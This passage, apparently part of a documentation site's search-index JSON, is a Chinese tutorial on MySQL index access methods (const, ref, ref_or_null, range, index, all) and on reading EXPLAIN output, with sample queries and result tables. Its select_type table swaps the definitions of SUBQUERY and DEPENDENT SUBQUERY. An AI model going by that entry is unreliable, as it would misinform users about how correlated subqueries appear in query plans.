\u5982\u679c\u4e3b\u952e\u662f\u81ea\u589e(AUTO_INCREMENT)\u7684\uff0c\u90a3\u6211\u4eec\u6bcf\u63d2\u6ee1\u4e00\u4e2a\u6570\u636e\u9875\u5c31\u4f1a\u53bb\u63d2\u4e0b\u4e00\u4e2a\u6570\u636e\u9875\u3002\u800c\u5982\u679c\u63d2\u5165\u7684\u4e3b\u952e\u503c\u5ffd\u5927\u5ffd\u5c0f\uff0c\u5c31\u53ef\u80fd\u4f1a\u53d1\u751f\u9875\u5206\u88c2\u548c\u8bb0\u5f55\u79fb\u52a8\uff0c\u9020\u6210\u4e0d\u5fc5\u8981\u7684\u6027\u80fd\u635f\u8017\u3002</p> <p>\u907f\u514d\u5197\u4f59\u91cd\u590d\u7d22\u5f15 \u8fd9\u5f80\u5f80\u53d1\u751f\u5728\u67d0\u4e2a\u7d22\u5f15\u5df2\u7ecf\u88ab\u8054\u5408\u7d22\u5f15\u5305\u542b\u5230\u4e86\uff0c\u6216\u8005\u5bf9\u67d0\u4e2a\u5217\u65e2\u5efa\u7acb\u4e86\u552f\u4e00\u7d22\u5f15\u548c\u666e\u901a\u7d22\u5f15\u3002</p>"},{"location":"mysql/theory/#_18","title":"\u8bbf\u95ee\u65b9\u6cd5","text":"<p>\u6211\u4eec\u5e73\u65f6\u6240\u5199\u7684\u67e5\u8be2\u8bed\u53e5\u672c\u8d28\u4e0a\u53ea\u662f\u4e00\u79cd\u58f0\u660e\u5f0f\u8bed\u6cd5\uff0c\u53ea\u662f\u544a\u8bc9MySQL\u6211\u4eec\u8981\u83b7\u53d6\u7684\u6570\u636e\u7b26\u5408\u54ea\u4e9b\u89c4\u5219\uff0c\u81f3\u4e8eMySQL\u80cc\u5730\u91cc\u662f\u600e\u4e48\u628a\u67e5\u8be2\u7ed3\u679c\u641e\u51fa\u6765\u7684\u90a3\u662fMySQL\u81ea\u5df1\u7684\u4e8b\u513f\u3002\u6211\u4eec\u628aMySQL\u6267\u884c\u67e5\u8be2\u8bed\u53e5\u7684\u65b9\u5f0f\u79f0\u4e4b\u4e3a\u8bbf\u95ee\u65b9\u6cd5\u6216\u8005\u8bbf\u95ee\u7c7b\u578b\u3002\u540c\u4e00\u4e2a\u67e5\u8be2\u8bed\u53e5\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u4e0d\u540c\u7684\u8bbf\u95ee\u65b9\u6cd5\u6765\u6267\u884c\uff0c\u867d\u7136\u6700\u540e\u7684\u67e5\u8be2\u7ed3\u679c\u90fd\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f\u6267\u884c\u7684\u65f6\u95f4\u53ef\u80fd\u5dee\u8ddd\u5f88\u5927\u3002</p> <p>\u6211\u4eec\u4ee5\u6b64\u8868\u683c\u4e3a\u4f8b\uff0c\u770b\u770b\u4e0d\u540c\u7684\u8bbf\u95ee\u65b9\u6cd5: <pre><code>CREATE TABLE single_table (\n    id INT NOT NULL AUTO_INCREMENT,\n    key1 VARCHAR(100),\n    key2 INT,\n    key3 VARCHAR(100),\n    key_part1 VARCHAR(100),\n    key_part2 VARCHAR(100),\n    key_part3 VARCHAR(100),\n    common_field VARCHAR(100),\n    PRIMARY KEY (id),\n    KEY idx_key1 (key1),\n    UNIQUE KEY idx_key2 (key2),\n    KEY idx_key3 (key3),\n    KEY idx_key_part(key_part1, key_part2, key_part3)\n) Engine=InnoDB CHARSET=utf8;\n</code></pre> \u5b83\u6709\u4e3b\u952eid\u3001\u552f\u4e00\u4e8c\u7ea7\u7d22\u5f15key2\u3001\u666e\u901a\u4e8c\u7ea7\u7d22\u5f15key1\u548ckey3\u3001\u8054\u5408\u7d22\u5f15\u3002</p>"},{"location":"mysql/theory/#const","title":"const","text":"<p>\u5f53\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u4e3b\u952e\u5217\u6216\u552f\u4e00\u4e8c\u7ea7\u7d22\u5f15\u5217\u6765\u4e0e\u5e38\u6570\u7684\u7b49\u503c\u6bd4\u8f83\u6765\u5b9a\u4f4d\u5230\u4e00\u6761\u8bb0\u5f55\u65f6\uff0c\u901f\u5ea6\u662f\u975e\u5e38\u5feb\u7684\uff0c\u8fd9\u79cd\u8bbf\u95ee\u65b9\u6cd5\u79f0\u4e3a\u200bconst\u3002\u4f8b\u5982:<code>SELECT * FROM single_table WHERE id = 1438;</code>\u3001<code>SELECT * FROM single_table WHERE key2 = 3841;</code>\u3002\u4e3b\u952e\u5217\u53ea\u9700\u8981\u4e00\u6b21\u5b9a\u4f4d\uff0c\u552f\u4e00\u7d22\u5f15\u5217\u4e5f\u53ea\u9700\u8981\u4e24\u6b21\u5b9a\u4f4d\u3002</p> <p>\u5bf9\u4e8e\u552f\u4e00\u4e8c\u7ea7\u7d22\u5f15\u6765\u8bf4\uff0c\u67e5\u8be2\u8be5\u5217\u4e3aNULL\u503c\u7684\u60c5\u51b5\u6bd4\u8f83\u7279\u6b8a\uff0c\u56e0\u4e3a\u552f\u4e00\u7d22\u5f15\u5e76\u4e0d\u9650\u5236\u5176\u5217\u4e3aNULL\u503c\u7684\u6570\u91cf\uff0c\u6240\u4ee5\u4f7f\u7528<code>SELECT * FROM single_table WHERE key2 IS NULL;</code>\u67e5\u8be2\u65f6\u4e0d\u4f1a\u7528const\u8bbf\u95ee\u65b9\u6cd5\u3002</p>"},{"location":"mysql/theory/#ref","title":"ref","text":"<p>\u5bf9\u4e8e\u67d0\u4e2a\u666e\u901a\u4e8c\u7ea7\u7d22\u5f15\u5217\u548c\u5e38\u6570\u503c\u7684\u7b49\u503c\u6bd4\u8f83\uff0c\u6bd4\u5982<code>SELECT * FROM single_table WHERE key1 = 'abc';</code>\uff0c\u7531\u4e8e\u666e\u901a\u7d22\u5f15\u5e76\u4e0d\u9650\u5236\u7d22\u5f15\u5217\u503c\u7684\u552f\u4e00\u6027\uff0c\u6240\u4ee5\u53ef\u80fd\u627e\u5230\u591a\u6761\u5bf9\u5e94\u7684\u8bb0\u5f55\uff0c\u90a3\u4e48\u8fd9\u79cd\u65b9\u5f0f\u7684\u4ee3\u4ef7\u53d6\u51b3\u4e8e\u5339\u914d\u5230\u7684\u4e8c\u7ea7\u7d22\u5f15\u8bb0\u5f55\u7684\u6761\u6570\uff0c\u5982\u679c\u5339\u914d\u7684\u8bb0\u5f55\u8f83\u5c11\uff0c\u5219\u56de\u8868\u4ee3\u4ef7\u8f83\u4f4e\u3002\u8fd9\u79cd\u65b9\u6cd5\u79f0\u4e3a\u200bref\uff0c\u5b83\u7684\u6548\u7387\u6bd4const\u5dee\u4e86\u4e00\u4e9b\u3002</p> <p>\u5982\u679c\u6700\u5de6\u8fb9\u7684\u8fde\u7eed\u7d22\u5f15\u5217\u662f\u4e0e\u5e38\u6570\u7684\u7b49\u503c\u6bd4\u8f83\u5c31\u53ef\u80fd\u91c7\u7528ref\u7684\u65b9\u6cd5\uff0c\u5982<code>SELECT * FROM single_table WHERE key_part1 ='god like'AND key_part2 = 'legendary';</code>\uff0c\u4f46\u5982\u679c\u4e0d\u5168\u662f\u7b49\u503c\u6bd4\u8f83\u7684\u8bdd\uff0c\u5b83\u7684\u8bbf\u95ee\u65b9\u6cd5\u5c31\u4e0d\u4f1a\u662fref\u4e86\uff0c\u5982<code>SELECT * FROM single_table WHERE key_part1 ='god like'AND key_part2 &gt; 'legendary';</code></p> <p>\u666e\u901a\u4e8c\u7ea7\u7d22\u5f15\u6216\u552f\u4e00\u4e8c\u7ea7\u7d22\u5f15\u4f7f\u7528<code>Key IS NULL</code>\u8fd9\u6837\u7684\u65b9\u5f0f\u4f5c\u4e3a\u641c\u7d22\u6761\u4ef6\u65f6\uff0c\u53ef\u80fd\u4f7f\u7528ref\u7684\u8bbf\u95ee\u65b9\u6cd5\u3002</p>"},{"location":"mysql/theory/#ref_or_null","title":"ref_or_null","text":"<p>\u5f53\u6211\u4eec\u4e0d\u4ec5\u60f3\u627e\u51fa\u67d0\u4e2a\u7d22\u5f15\u5217\u7684\u503c\u7b49\u4e8e\u67d0\u4e2a\u5e38\u6570\u7684\u8bb0\u5f55\uff0c\u8fd8\u540c\u65f6\u60f3\u627e\u51fa\u8be5\u5217\u4e3aNULL\u7684\u8bb0\u5f55\u65f6\uff0c\u4f8b\u5982<code>SELECT * FROM single_demo WHERE key1 = 'abc' OR key1 ISNULL;</code>\u3002\u8fd9\u79cd\u67e5\u8be2\u4f7f\u7528\u7684\u8bbf\u95ee\u65b9\u6cd5\u4e3a\u200bref_or_null\u3002\u5b83\u7684\u67e5\u8be2\u4e5f\u4f1a\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4\uff0c\u5148\u5206\u522b\u5b9a\u4f4dkey1=abc\u548ckey1\u662fnull\u7684\u8fde\u7eed\u8bb0\u5f55\u5e76\u627e\u5230\u8fd9\u4e9b\u8bb0\u5f55\u5bf9\u5e94\u7684\u4e3b\u952e\u503c\uff0c\u518d\u4ece\u805a\u7c07\u7d22\u5f15\u4e0a\u6839\u636e\u4e3b\u952e\u627e\u5230\u5b8c\u6574\u7684\u7528\u6237\u8bb0\u5f55\u3002</p>"},{"location":"mysql/theory/#range","title":"range","text":"<p>\u4e4b\u524d\u7684\u65b9\u5f0f\u90fd\u662f\u548c\u5e38\u6570\u7b49\u503c\u6bd4\u8f83\uff0c\u4f46\u6709\u65f6\u6211\u4eec\u9762\u5bf9\u7684\u641c\u7d22\u6761\u4ef6\u4f1a\u66f4\u590d\u6742\uff0c\u4f8b\u5982<code>SELECT * FROM single_table WHERE key2 IN (1438,6328) OR (key2 &gt;= 38AND key2 &lt;= 79);</code>\uff0c\u9664\u4e86\u53ef\u80fd\u4f7f\u7528\u5168\u8868\u626b\u63cf\u7684\u8bbf\u95ee\u65b9\u6cd5\uff0c\u4e5f\u53ef\u80fd\u4f7f\u7528\u4e8c\u7ea7\u7d22\u5f15+\u56de\u8868\u7684\u8bbf\u95ee\u65b9\u6cd5\u3002\u5982\u679c\u91c7\u7528\u56de\u8868\u7684\u65b9\u5f0f\uff0c\u7d22\u5f15\u5217\u5c31\u9700\u8981\u5339\u914d\u67d0\u4e2a\u6216\u67d0\u4e9b\u8303\u56f4\u7684\u503c\uff0c\u8fd9\u79cd\u5229\u7528\u7d22\u5f15\u8fdb\u884c\u8303\u56f4\u5339\u914d\u7684\u8bbf\u95ee\u65b9\u6cd5\u79f0\u4e3a\u200brange\u3002</p> <p>\u8be5\u4f8b\u4e2d\uff0c\u4f1a\u5206\u4e3a\u4e09\u4e2a\u8303\u56f4\uff0c\u5373key2=1438\u3001key2=6328\u3001key2\u2208[38,79]\u3002\u8303\u56f4\u4e00\u3001\u8303\u56f4\u4e8c\u88ab\u79f0\u4e3a\u5355\u70b9\u533a\u95f4\uff0c\u8303\u56f4\u4e09\u79f0\u4e3a\u8fde\u7eed\u8303\u56f4\u7a7a\u95f4\u3002</p>"},{"location":"mysql/theory/#index","title":"index","text":"<p>\u770b\u8fd9\u4e2a\u67e5\u8be2<code>SELECT key_part1, key_part2, key_part3 FROMsingle_table WHERE key_part2 = 'abc';</code>\uff0c\u7531\u4e8ekey_part2\u4e0d\u662f\u8054\u5408\u7d22\u5f15idx_key_part\u7684\u6700\u5de6\u7d22\u5f15\u5217\uff0c\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u4f7f\u7528ref\u7684\u8bbf\u95ee\u65b9\u6cd5\u6765\u6267\u884c\u8fd9\u4e2a\u8bed\u53e5\u3002\u4f46\u8fd9\u4e2a\u8bed\u53e5\u6709\u4e24\u4e2a\u7279\u70b9\uff0c\u4e00\u662f\u5b83\u7684\u67e5\u8be2\u5217\u8868\u53ea\u6709\u4e09\u4e2a\u5217key_part1\u3001key_part2\u3001key_part3\u4e14\u90fd\u88ab\u8054\u5408\u7d22\u5f15\u5305\u542b\uff0c\u4e8c\u662f\u641c\u7d22\u6761\u4ef6\u53ea\u6709key_part2\u5217\u4e5f\u88ab\u5305\u542b\u5728\u8054\u5408\u7d22\u5f15\u4e2d\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u904d\u5386idx_key_part\u8fd9\u9897B+\u6811\u7684\u53f6\u5b50\u8282\u70b9\u6765\u5f97\u5230\u7ed3\u679c\uff0c\u800c\u4e0d\u9700\u8981\u56de\u8868\uff0c\u56e0\u4e3a\u8fd9\u68f5\u6811\u6bd4\u805a\u7c07\u7d22\u5f15\u7684\u6811\u5c0f\u7684\u591a\uff0c\u5b83\u7684\u6210\u672c\u4e5f\u8981\u5c0f\u5f88\u591a\uff0c\u6211\u4eec\u628a\u8fd9\u79cd\u8bbf\u95ee\u65b9\u6cd5\u79f0\u4e3a\u200bindex\u3002</p>"},{"location":"mysql/theory/#all","title":"all","text":"<p>\u6700\u76f4\u63a5\u7684\u67e5\u8be2\u6267\u884c\u65b9\u5f0f\u5c31\u662f\u5168\u8868\u626b\u63cf\uff0c\u5bf9\u4e8eInnoDB\u6765\u8bf4\u5c31\u662f\u76f4\u63a5\u626b\u63cf\u805a\u7c07\u7d22\u5f15\uff0c\u8fd9\u79cd\u8bbf\u95ee\u65b9\u6cd5\u79f0\u4e3a\u200ball\u3002</p>"},{"location":"mysql/theory/#explain","title":"EXPLAIN","text":"<p>\u4e00\u6761\u67e5\u8be2\u8bed\u53e5\u5728\u7ecf\u8fc7MySQL\u67e5\u8be2\u4f18\u5316\u5668\u7684\u5404\u79cd\u57fa\u4e8e\u6210\u672c\u548c\u89c4\u5219\u7684\u4f18\u5316\u540e\u4f1a\u751f\u6210\u4e00\u4e2a\u6267\u884c\u8ba1\u5212\uff0c\u8fd9\u4e2a\u6267\u884c\u8ba1\u5212\u5c55\u793a\u4e86\u63a5\u4e0b\u6765\u5177\u4f53\u6267\u884c\u67e5\u8be2\u7684\u65b9\u5f0f\uff0c\u6bd4\u5982\u591a\u8868\u8fde\u63a5\u7684\u987a\u5e8f\u662f\u4ec0\u4e48\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u8868\u91c7\u7528\u4ec0\u4e48\u8bbf\u95ee\u65b9\u6cd5\u6765\u5177\u4f53\u6267\u884c\u67e5\u8be2\u7b49\u7b49\u3002EXPLAIN\u80fd\u5e2e\u52a9\u6211\u4eec\u67e5\u770b\u5230\u67d0\u4e2a\u67e5\u8be2\u8bed\u53e5\u7684\u5177\u4f53\u6267\u884c\u8ba1\u5212\u3002\u4f8b\u5982: <pre><code>mysql&gt; explain select 1;\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+\n| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra          |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+\n|  1 | SIMPLE      | NULL  | NULL       | NULL | NULL          | NULL | NULL    | NULL | NULL |     NULL | No tables used |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+\n1 row in set, 1 warning (0.00 sec)\n</code></pre></p> <p>\u5404\u5217\u7684\u8be6\u7ec6\u89e3\u91ca\u5982\u4e0b:</p> \u5217\u540d \u63cf\u8ff0 <code>id</code> \u5728\u4e00\u4e2a\u67e5\u8be2\u8bed\u53e5\u4e2d\u6bcf\u4e2a<code>SELECT</code>\u5173\u952e\u5b57\u90fd\u5bf9\u5e94\u4e00\u4e2a\u552f\u4e00<code>id</code> <code>select_type</code> <code>SELECT</code>\u5173\u952e\u5b57\u5bf9\u5e94\u7684\u67e5\u8be2\u7684\u7c7b\u578b <code>table</code> \u8868\u540d <code>partitions</code> \u5339\u914d\u7684\u5206\u533a\u4fe1\u606f <code>type</code> \u9488\u5bf9\u5355\u8868\u7684\u8bbf\u95ee\u65b9\u6cd5 <code>possible_keys</code> \u53ef\u80fd\u7528\u5230\u7684\u7d22\u5f15 <code>key</code> \u5b9e\u9645\u4e0a\u4f7f\u7528\u7684\u7d22\u5f15 <code>key_len</code> \u5b9e\u9645\u4f7f\u7528\u5230\u7684\u7d22\u5f15\u957f\u5ea6 <code>ref</code> \u5f53\u4f7f\u7528\u7d22\u5f15\u5217\u7b49\u503c\u67e5\u8be2\u65f6\uff0c\u4e0e\u7d22\u5f15\u5217\u8fdb\u884c\u7b49\u503c\u5339\u914d\u7684\u5bf9\u8c61\u4fe1\u606f <code>rows</code> \u9884\u4f30\u7684\u9700\u8981\u8bfb\u53d6\u7684\u8bb0\u5f55\u6761\u6570 <code>filtered</code> \u67d0\u4e2a\u8868\u7ecf\u8fc7\u641c\u7d22\u6761\u4ef6\u8fc7\u6ee4\u540e\u5269\u4f59\u8bb0\u5f55\u6761\u6570\u7684\u767e\u5206\u6bd4 <code>Extra</code> \u4e00\u4e9b\u989d\u5916\u7684\u4fe1\u606f <p>table</p> <p><pre><code>mysql&gt; explain select * from s1, s2;\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+---------------------------------------+\n| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra                                 |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+---------------------------------------+\n|  1 | SIMPLE      | s1    | NULL       | ALL  | NULL          | NULL | NULL    | NULL |    1 |   100.00 | NULL                                  |\n|  1 | SIMPLE      | s2    | NULL       | ALL  | NULL          | NULL | NULL    | NULL |    1 |   100.00 | Using join buffer (Block Nested Loop) |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+---------------------------------------+\n2 rows in set, 1 warning (0.00 sec)\n</code></pre> \u6211\u4eec\u770b\u5230EXPLAIN\u8bed\u53e5\u8f93\u51fa\u7684\u6bcf\u6761\u8bb0\u5f55\u90fd\u5bf9\u5e94\u7740\u67d0\u4e2a\u5355\u8868\u7684\u8bbf\u95ee\u65b9\u6cd5\uff0c\u8be5\u6761\u8bb0\u5f55\u7684table\u5217\u4ee3\u8868\u4e86\u8be5\u8868\u7684\u8868\u540d\u3002</p> <p>id</p> <p>\u67e5\u8be2\u8bed\u53e5\u4e00\u822c\u4ee5select\u5173\u952e\u5b57\u5f00\u5934\uff0c\u7b80\u5355\u7684\u67e5\u8be2\u8bed\u53e5\u53ea\u6709\u4e00\u4e2aselect\uff0c\u4f46\u6709\u4e24\u79cd\u60c5\u51b5\u4f1a\u51fa\u73b0\u591a\u4e2aselect:</p> <ul> <li>\u67e5\u8be2\u8bed\u53e5\u5305\u542b\u5b50\u67e5\u8be2\uff0c\u5982<code>SELECT * FROM s1 WHERE key1 IN (SELECT * FROM s2);</code></li> <li>\u67e5\u8be2\u8bed\u53e5\u5305\u542bUNION\u8bed\u53e5\uff0c\u5982<code>SELECT * FROM s1 UNION SELECT * FROM s2;</code></li> </ul> <p>\u6bcf\u591a\u4e00\u4e2aselect\u5173\u952e\u5b57\uff0c\u5c31\u4f1a\u7ed9\u5b83\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684id\u503c\u3002\u5bf9\u4e8e\u8fde\u63a5\u67e5\u8be2\u6765\u8bf4\uff0c\u8fd9\u4e2aid\u662f\u76f8\u540c\u7684\uff0c\u51fa\u73b0\u5728\u524d\u9762\u7684\u5c31\u662f\u9a71\u52a8\u8868\uff0c\u540e\u9762\u7684\u662f\u88ab\u9a71\u52a8\u8868\u3002\u5982: <pre><code>mysql&gt; EXPLAIN SELECT * FROM s1 WHERE key1 IN(SELECT key1 FROM s2) OR key3 = 'a';\n+----+--------------------+-------+------------+----------------+---------------+----------+---------+------+------+----------+-------------+\n| id | select_type        | table | partitions | type           | possible_keys | key      | key_len | ref  | rows | filtered | Extra       |\n+----+--------------------+-------+------------+----------------+---------------+----------+---------+------+------+----------+-------------+\n|  1 | PRIMARY            | s1    | NULL       | ALL            | idx_key3      | NULL     | NULL    | NULL |    1 |   100.00 | Using where |\n|  2 | DEPENDENT SUBQUERY | s2    | NULL       | index_subquery | idx_key1      | idx_key1 | 303     | func |    1 |   100.00 | Using index |\n+----+--------------------+-------+------------+----------------+---------------+----------+---------+------+------+----------+-------------+\n2 rows in set, 1 warning (0.00 sec)\n</code></pre></p> <p>\u4f46\u662f\u67e5\u8be2\u4f18\u5316\u5668\u53ef\u80fd\u4f1a\u5c06\u5b50\u67e5\u8be2\u8f6c\u6362\u4e3a\u8fde\u63a5\u67e5\u8be2\uff0c\u6240\u4ee5\u4f1a\u770b\u5230\u4e24\u4e2a\u76f8\u540c\u7684id: <pre><code>mysql&gt; EXPLAIN SELECT * FROM s1 WHERE key1 IN(SELECT key3 FROM s2 WHERE common_field = 'a');\n+----+-------------+-------+------------+------+---------------+----------+---------+-----------------+------+----------+-----------------------------+\n| id | select_type | table | partitions | type | possible_keys | key      | key_len | ref             | rows | filtered | Extra                       |\n+----+-------------+-------+------------+------+---------------+----------+---------+-----------------+------+----------+-----------------------------+\n|  1 | SIMPLE      | s1    | NULL       | ALL  | idx_key1      | NULL     | NULL    | NULL            |    1 |   100.00 | Using where                 |\n|  1 | SIMPLE      | s2    | NULL       | ref  | idx_key3      | idx_key3 | 303     | awesome.s1.key1 |    1 |   100.00 | Using where; FirstMatch(s1) |\n+----+-------------+-------+------------+------+---------------+----------+---------+-----------------+------+----------+-----------------------------+\n2 rows in set, 1 warning (0.00 sec)\n</code></pre></p> <p>UNION\u5b50\u53e5\u4f1a\u901a\u8fc7\u521b\u5efa\u4e34\u65f6\u8868\u628a\u591a\u4e2a\u67e5\u8be2\u7684\u7ed3\u679c\u5408\u5e76\u8d77\u6765\u8fdb\u884c\u53bb\u91cd\uff0c\u6240\u4ee5\u4f1a\u6709\u4e00\u6761NULL\u7684\u8bb0\u5f55\uff0cUNION ALL\u4e0d\u53bb\u91cd\u5c31\u4e0d\u4f1a\u6709\u8fd9\u6761\u8bb0\u5f55: <pre><code>mysql&gt; EXPLAIN SELECT * FROM s1  UNION SELECT *FROM s2;\n+----+--------------+------------+------------+------+---------------+------+---------+------+------+----------+-----------------+\n| id | select_type  | table      | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra           |\n+----+--------------+------------+------------+------+---------------+------+---------+------+------+----------+-----------------+\n|  1 | PRIMARY      | s1         | NULL       | ALL  | NULL          | NULL | NULL    | NULL |    1 |   100.00 | NULL            |\n|  2 | UNION        | s2         | NULL       | ALL  | NULL          | NULL | NULL    | NULL |    1 |   100.00 | NULL            |\n| NULL | UNION RESULT | &lt;union1,2&gt; | NULL       | ALL  | NULL          | NULL | NULL    | NULL | NULL |     NULL | Using temporary |\n+----+--------------+------------+------------+------+---------------+------+---------+------+------+----------+-----------------+\n3 rows in set, 1 warning (0.00 sec)\n</code></pre></p> <p>select_type</p> <p>\u6bcf\u4e2aselect\u5173\u952e\u5b57\u90fd\u4ee3\u8868\u7740\u4e00\u4e2a\u5c0f\u7684\u67e5\u8be2\u8bed\u53e5\uff0cselect_type\u5c31\u662f\u63cf\u8ff0\u8fd9\u4e2a\u5c0f\u7684\u67e5\u8be2\u8bed\u53e5\u5728\u5927\u7684\u67e5\u8be2\u4e2d\u626e\u6f14\u7684\u89d2\u8272\uff0c\u5b83\u7684\u53d6\u503c\u6709\u8fd9\u4e9b\u53ef\u80fd:</p> \u540d\u79f0 \u63cf\u8ff0 <code>SIMPLE</code> \u4e0d\u5305\u542bUNION\u6216\u5b50\u67e5\u8be2\u7684\u8bdd\u90fd\u662f\u8be5\u7c7b\u578b <code>PRIMARY</code> \u5bf9\u4e8e\u5927\u67e5\u8be2\u6765\u8bf4\uff0c\u6700\u5de6\u8fb9\u7684\u5c0f\u67e5\u8be2 <code>UNION</code> \u5bf9\u4e8e\u5305\u542bUNION\u7684\u5927\u67e5\u8be2\uff0c\u9664\u6700\u5de6\u8fb9\u7684\u5c0f\u67e5\u8be2\u4ee5\u5916\u7684\u5c0f\u67e5\u8be2 <code>UNION RESULT</code> \u5bf9\u4e8eUNION\u4f1a\u521b\u5efa\u4e34\u65f6\u8868\uff0c\u9488\u5bf9\u8be5\u4e34\u65f6\u8868\u7684\u67e5\u8be2 <code>SUBQUERY</code> \u5b50\u67e5\u8be2\u662f\u76f8\u5173\u5b50\u67e5\u8be2\u65f6\uff0c\u5b83\u7684\u7b2c\u4e00\u4e2aSELECT\u4ee3\u8868\u7684\u67e5\u8be2 <code>DEPENDENT SUBQUERY</code> \u5b50\u67e5\u8be2\u662f\u4e0d\u76f8\u5173\u5b50\u67e5\u8be2\u65f6\uff0c\u5b83\u7684\u7b2c\u4e00\u4e2aSELECT\u4ee3\u8868\u7684\u67e5\u8be2 <code>DEPENDENT UNION</code> \u5305\u542bUNION\u6216UNION ALL\u7684\u5927\u67e5\u8be2\uff0c\u5982\u679c\u5404\u5c0f\u67e5\u8be2\u4f9d\u8d56\u5916\u5c42\u67e5\u8be2\uff0c\u9664\u6700\u5de6\u8fb9\u7684\u5c0f\u67e5\u8be2\u4e4b\u5916\u7684\u5c0f\u67e5\u8be2 <code>DERIVED</code> \u5bf9\u4e8e\u91c7\u7528\u7269\u5316\u65b9\u5f0f\u6267\u884c\u7684\u5305\u542b\u6d3e\u751f\u8868\u7684\u67e5\u8be2\uff0c\u5bf9\u4e8e\u6d3e\u751f\u8868\u7684\u5b50\u67e5\u8be2 <code>MATERIALIZED</code> \u82e5\u67e5\u8be2\u4f18\u5316\u5668\u9009\u62e9\u5c06\u5b50\u67e5\u8be2\u7269\u5316\u4e4b\u540e\u4e0e\u5916\u5c42\u67e5\u8be2\u8fdb\u884c\u8fde\u63a5\u67e5\u8be2 <code>UNCACHEABLE SUBQUERY</code> \u4e0d\u5e38\u7528 <code>UNCACHEABLE UNION</code> \u4e0d\u5e38\u7528 <p>partitions</p> <p>\u5206\u533a\u4fe1\u606f\uff0c\u4e00\u822c\u8be5\u5217\u503c\u90fd\u4e3aNULL\u3002</p> <p>type</p> <p>\u4ee3\u8868Mysql\u5bf9\u8fd9\u4e2a\u8868\u6267\u884c\u67e5\u8be2\u65f6\u7684\u8bbf\u95ee\u65b9\u6cd5\uff0c\u4e4b\u524d\u5df2\u7ecf\u63d0\u5230\u8fc7\u90e8\u5206\uff0c\u8fd9\u5217\u53ef\u80fd\u7684\u503c\u6709:</p> <ul> <li>system\uff0c\u8868\u4e2d\u53ea\u6709\u4e00\u6761\u8bb0\u5f55\u4e14\u8be5\u8868\u4f7f\u7528\u7684\u5b58\u50a8\u5f15\u64ce\u7684\u7edf\u8ba1\u6570\u636e\u662f\u7cbe\u786e\u7684\uff0c\u6bd4\u5982MyISAM\u3001Memory</li> <li>const\uff0c\u5bf9\u5e94const</li> <li>eq_ref\uff0c\u8fde\u63a5\u67e5\u8be2\u65f6\uff0c\u82e5\u88ab\u9a71\u52a8\u8868\u662f\u901a\u8fc7\u4e3b\u952e\u6216\u8005\u552f\u4e00\u4e8c\u7ea7\u7d22\u5f15\u5217\u7b49\u503c\u5339\u914d\u7684\u65b9\u5f0f\u8fdb\u884c\u8bbf\u95ee\u7684</li> <li>ref\uff0c\u5bf9\u5e94ref</li> <li>fulltext\uff0c\u5168\u6587\u7d22\u5f15</li> <li>ref_or_null\uff0c\u5bf9\u5e94ref_or_null</li> <li>index_merge\uff0c\u4e00\u822c\u5bf9\u67d0\u8868\u7684\u67e5\u8be2\u53ea\u80fd\u7528\u4e00\u4e2a\u7d22\u5f15\uff0c\u4f46\u67d0\u4e9b\u573a\u666f\u53ef\u4ee5\u4f7f\u7528Intersection\u3001Union\u3001Sort-Union\u8fd9\u4e09\u79cd\u7d22\u5f15\u5408\u5e76\u7684\u65b9\u5f0f</li> <li>unique_subquery\uff0c\u5728\u4e00\u4e9b\u5305\u542bIN\u7684\u5b50\u67e5\u8be2\u8bed\u53e5\uff0c\u82e5\u67e5\u8be2\u4f18\u5316\u5668\u51b3\u5b9a\u5c06IN\u8f6c\u6362\u4e3aEXISTS\u5b50\u67e5\u8be2\u4e14\u5b83\u53ef\u4ee5\u7528\u5230\u4e3b\u952e\u8fdb\u884c\u7b49\u503c\u5339\u914d</li> <li>index_subquery\uff0c\u548cunique_subquery\u7c7b\u4f3c\uff0c\u53ea\u662f\u8bbf\u95ee\u5b50\u67e5\u8be2\u7684\u8868\u65f6\u4f7f\u7528\u7684\u666e\u901a\u7d22\u5f15</li> <li>range\uff0c\u5bf9\u5e94range</li> <li>index\uff0c\u5bf9\u5e94index</li> <li>ALL\uff0c\u5bf9\u5e94all</li> </ul> <p>possible_keys\u548ckey</p> <p>possible_keys\u8868\u793a\u4e00\u5f00\u59cb\u7684\u67e5\u8be2\u8bed\u53e5\u53ef\u80fd\u4f7f\u7528\u5230\u7684\u7d22\u5f15\uff0c\u800ckey\u8868\u793a\u7ecf\u8fc7\u4e86\u67e5\u8be2\u4f18\u5316\u5668\u8ba1\u7b97\u4f7f\u7528\u4e0d\u540c\u7684\u7d22\u5f15\u6210\u672c\u4e4b\u540e\uff0c\u5b9e\u9645\u4e0a\u4f1a\u4f7f\u7528\u5230\u7684\u7d22\u5f15\u3002\u4f8b\u5982: <pre><code>mysql&gt; EXPLAIN SELECT * FROM s1 WHERE key1 &gt; 'z'AND key3 = 'a';\n+----+-------------+-------+------------+------+-------------------+----------+---------+-------+------+----------+-------------+\n| id | select_type | table | partitions | type | possible_keys     | key      | key_len | ref   | rows | filtered | Extra       |\n+----+-------------+-------+------------+------+-------------------+----------+---------+-------+------+----------+-------------+\n|  1 | SIMPLE      | s1    | NULL       | ref  | idx_key1,idx_key3 | idx_key3 | 303     | const |    1 |   100.00 | Using where |\n+----+-------------+-------+------------+------+-------------------+----------+---------+-------+------+----------+-------------+\n1 row in set, 1 warning (0.01 sec)\n</code></pre></p> 